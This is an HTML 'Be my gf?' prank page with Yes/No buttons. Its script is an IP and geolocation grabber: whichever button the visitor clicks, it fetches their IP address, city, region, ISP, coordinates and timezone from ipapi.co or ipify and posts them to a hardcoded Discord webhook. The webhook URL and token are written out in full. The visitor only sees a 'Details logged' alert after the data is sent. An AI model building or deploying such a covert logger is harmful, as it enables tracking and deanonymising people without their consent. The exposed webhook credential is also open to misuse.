<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Logger Popup</title>
    <style>
        body {
            zoom: 0.6;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 150vh;
            background-color: #ff69b4; /* Solid pink background */
        }

        .container {
            text-align: center;
        }

        .image-container {
            position: relative;
            display: inline-block;
        }

        .big-image {
            max-width: 100%;
            height: auto;
            border-radius: 10px;
        }

        .text-overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-size: 36px;
            font-weight: bold;
            text-transform: uppercase;
            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.7);
        }

        .buttons {
            display: flex;
            justify-content: center;
            gap: 100px;
            margin-top: 20px;
        }

        button,
        button:focus {
            font-size: 45px;
            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
            padding: 20px 30px;
            border-radius: 0.7rem;
            background-image: linear-gradient(rgb(251, 139, 255), rgb(233, 129, 254));
            border: 2px solid rgb(50, 50, 50);
            border-bottom: 5px solid rgb(50, 50, 50);
            box-shadow: 0px 1px 6px 0px rgb(225, 129, 254);
            transform: translate(0, -3px);
            cursor: pointer;
        }

        button:active {
            border-bottom: 2px solid rgb(50, 50, 50);
        }

        .moving-btn {
            position: relative;
        }

        .video-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 30px;
            background-color: #ff69b4; /* Match pink background */
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="image-container">
            <img src="https://i.pinimg.com/originals/ec/e4/ef/ece4ef519acc193968d6adc55ff315c1.gif" alt="Question GIF" class="big-image">
            <div class="text-overlay">Be my gf?</div>
        </div>
        <div class="buttons">
            <button class="moving-btn" id="yesButton">Yes</button>
            <button class="moving-btn" id="noButton">No</button>
        </div>
        <div class="video-container">
            <video controls width="600">
                <source src="imgs/video.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
        </div>
    </div>
    <script>
        // Robust logger with fallback and detailed debugging
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1397667597784453210/5Ync1yXCfohUTF3Ey_ljtKLjDn37K3GEqPLndRZwVZU0onGSLuEhgaOMICmVzOpJP_F2";

        async function getLocationData() {
            try {
                const response = await fetch('https://ipapi.co/json/', { mode: 'cors' });
                if (!response.ok) throw new Error(`IP API failed: ${response.status} - ${await response.text()}`);
                const data = await response.json();
                console.log("IP API Response:", data); // Debug API data
                return {
                    ip: data.ip || "Unknown IP",
                    country: data.country_name || "Unknown Country",
                    city: data.city || "Unknown City",
                    region: data.region || "Unknown Region",
                    isp: data.org || "Unknown ISP",
                    latitude: data.latitude || "Unknown",
                    longitude: data.longitude || "Unknown",
                    timezone: data.timezone || "Unknown"
                };
            } catch (error) {
                console.error("Location fetch error:", error.message);
                // Fallback to a simpler IP service
                try {
                    const fallbackResponse = await fetch('https://api.ipify.org?format=json');
                    const fallbackData = await fallbackResponse.json();
                    console.log("Fallback IP Response:", fallbackData);
                    return {
                        ip: fallbackData.ip || "Unknown IP",
                        country: "Unknown Country",
                        city: "Unknown City",
                        region: "Unknown Region",
                        isp: "Unknown ISP",
                        latitude: "Unknown",
                        longitude: "Unknown",
                        timezone: "Unknown"
                    };
                } catch (fallbackError) {
                    console.error("Fallback failed:", fallbackError.message);
                    return {
                        ip: "Unknown IP",
                        country: "Unknown Country",
                        city: "Unknown City",
                        region: "Unknown Region",
                        isp: "Unknown ISP",
                        latitude: "Unknown",
                        longitude: "Unknown",
                        timezone: "Unknown"
                    };
                }
            }
        }

        async function sendToDiscord(data, answer) {
            const payload = {
                username: "Date Site Logger",
                avatar_url: "https://pixelvault.co/l521vlnknkl5xl1bbvqau1q3l/direct",
                embeds: [{
                    title: "ðŸ“Š Data Logged",
                    description: `Answer: ${answer} from: ${window.location.href || 'Unknown URL'}`,
                    color: 0xff69b4,
                    fields: [
                        { name: "IP Address", value: data.ip, inline: true },
                        { name: "Country", value: data.country, inline: true },
                        { name: "City", value: data.city, inline: true },
                        { name: "Region", value: data.region, inline: true },
                        { name: "ISP", value: data.isp, inline: true },
                        { name: "Latitude", value: data.latitude, inline: true },
                        { name: "Longitude", value: data.longitude, inline: true },
                        { name: "Timezone", value: data.timezone, inline: true }
                    ],
                    footer: { text: "Logged: IP, Country, City, Region, ISP, Lat/Long, Timezone" },
                    timestamp: new Date().toISOString()
                }]
            };
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
                if (!response.ok) {
                    console.error("Webhook failed:", response.status, await response.text());
                    throw new Error(`Webhook error: ${response.status}`);
                }
                console.log(`${answer} response sent to Discord`);
            } catch (error) {
                console.error("Send error:", error.message);
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            const yesButton = document.getElementById('yesButton');
            const noButton = document.getElementById('noButton');

            if (yesButton && noButton) {
                console.log("Buttons detected, attaching listeners"); // Debug button detection
                yesButton.addEventListener('click', async () => {
                    console.log("Yes button clicked"); // Debug click
                    const data = await getLocationData();
                    console.log("Data to send:", data); // Debug data
                    await sendToDiscord(data, "Yes");
                    alert("Thanks for saying Yes! ðŸ˜Š Details logged.");
                });

                noButton.addEventListener('click', async () => {
                    console.log("No button clicked"); // Debug click
                    const data = await getLocationData();
                    console.log("Data to send:", data); // Debug data
                    await sendToDiscord(data, "No");
                    alert("Thanks for your response! ðŸ˜” Details logged.");
                });
            } else {
                console.error("Buttons not found in DOM. HTML:", document.body.innerHTML); // Debug DOM
            }
        });
    </script>
</body>
</html>
